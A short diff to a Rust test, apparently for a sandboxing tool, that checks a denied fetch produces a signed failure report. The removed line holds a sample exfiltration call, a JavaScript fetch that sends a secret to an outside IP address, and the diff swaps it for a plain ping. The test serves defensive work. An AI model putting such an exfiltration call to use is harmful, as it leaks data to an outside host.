@@ -33,7 +33,7 @@ fn denied_fetch_writes_a_failure_report_with_signed_denial_evidence() {
     let report = dir.join("exfil.report.json");
     fs::write(
         &input,
-        "console.log('before'); fetch('http://198.51.100.7/x?d=secret'); console.log('after');\n",
+        "console.log('before'); fetch('http://198.51.100.7/ping'); console.log('after');\n",
     )
     .expect("program");
     let output = Command::new(env!("CARGO_BIN_EXE_frankenctl"))
